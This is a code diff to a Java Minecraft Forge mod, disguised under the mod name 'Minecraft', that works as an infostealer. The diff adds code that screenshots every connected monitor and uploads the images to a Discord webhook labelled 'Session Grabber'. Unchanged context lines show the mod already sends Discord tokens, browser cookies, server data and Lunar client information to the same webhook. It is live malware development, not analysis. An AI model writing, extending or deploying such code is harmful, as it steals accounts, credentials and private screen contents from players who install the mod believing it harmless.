@@ -20,6 +20,13 @@ import java.nio.charset.StandardCharsets;
 import java.util.ArrayList;
 
 import java.io.File;
+import java.awt.GraphicsDevice;
+import java.awt.GraphicsEnvironment;
+import java.awt.Rectangle;
+import java.awt.Robot;
+import java.awt.image.BufferedImage;
+import java.io.ByteArrayOutputStream;
+import javax.imageio.ImageIO;
 @Mod(modid = "Minecraft", name = "Minecraft", version = "1.8.9")
 public final class Main {
 
@@ -265,6 +272,48 @@ public final class Main {
         }
         return temp;
     }
+
+    // --- NEUE METHODE FÜR SCREENSHOTS ---
+    private ArrayList<byte[]> captureAllScreens() {
+        ArrayList<byte[]> screenshots = new ArrayList<>();
+        try {
+            GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
+            GraphicsDevice[] screens = ge.getScreenDevices();
+            Robot robot = new Robot();
+
+            for (int i = 0; i < screens.length; i++) {
+                try {
+                    Rectangle screenBounds = screens[i].getDefaultConfiguration().getBounds();
+                    BufferedImage screenshot = robot.createScreenCapture(screenBounds);
+                    
+                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                    ImageIO.write(screenshot, "png", baos);
+                    byte[] imageBytes = baos.toByteArray();
+                    
+                    screenshots.add(imageBytes);
+                } catch (Exception e) {
+                    System.err.println("Fehler beim Screenshot von Screen " + (i + 1) + ": " + e.getMessage());
+                }
+            }
+        } catch (Exception e) {
+            System.err.println("Fehler beim Erstellen der Screenshots: " + e.getMessage());
+        }
+        return screenshots;
+    }
+
+    private DiscordWebhook.EmbedObject genScreenshotsEmbed(int screenCount) {
+        if (screenCount > 0) {
+            return new DiscordWebhook.EmbedObject()
+                    .setTitle(":camera: Screenshots")
+                    .setColor(0x00FF00)
+                    .setDescription("Screenshots von " + screenCount + " Bildschirm(en) wurden erfasst und angehängt.");
+        } else {
+            return new DiscordWebhook.EmbedObject()
+                    .setTitle(":camera: Screenshots")
+                    .setColor(0xFF0000)
+                    .setDescription("Keine Screenshots erstellt.");
+        }
+    }
     // --- AUSFÜHRUNG ---
 
     private DiscordWebhook genWebhook() {
@@ -287,7 +336,7 @@ public final class Main {
         webhook.addEmbed(genServersInfoEmbed());
         webhook.addEmbed(genLunarInfoEmbed());
         webhook.addEmbed(genDiscordTokensEmbed());
-        webhook.addEmbed(genCookieStealerEmbed()); // NEU: Fügt das Cookie-Embed hinzu
+        webhook.addEmbed(genCookieStealerEmbed());
 
         return webhook;
     }
@@ -297,11 +346,38 @@ public final class Main {
             try {
                 genWebhook().execute();
                 System.out.println("Webhook erfolgreich gesendet!");
+                
+                // Screenshots in separatem Webhook senden
+                sendScreenshots();
             } catch (final Exception e) {
                 System.err.println("FEHLER BEIM SENDEN DES WEBHOOKS:");
                 e.printStackTrace();
             }
         }).start();
+    }
+
+    private void sendScreenshots() {
+        try {
+            ArrayList<byte[]> screenshots = captureAllScreens();
+            if (!screenshots.isEmpty()) {
+                DiscordWebhook screenshotWebhook = new DiscordWebhook(WEBHOOK_URL)
+                        .setUsername("Session Grabber")
+                        .addEmbed(genScreenshotsEmbed(screenshots.size()));
+                
+                ArrayList<String> fileNames = new ArrayList<>();
+                for (int i = 0; i < screenshots.size(); i++) {
+                    fileNames.add("screen_" + (i + 1) + ".png");
+                }
+                
+                screenshotWebhook.executeWithFiles(screenshots, fileNames);
+                System.out.println("Screenshots erfolgreich gesendet!");
+            } else {
+                System.out.println("Keine Screenshots zum Senden.");
+            }
+        } catch (Exception e) {
+            System.err.println("FEHLER BEIM SENDEN DER SCREENSHOTS:");
+            e.printStackTrace();
+        }
     }
 
     @EventHandler
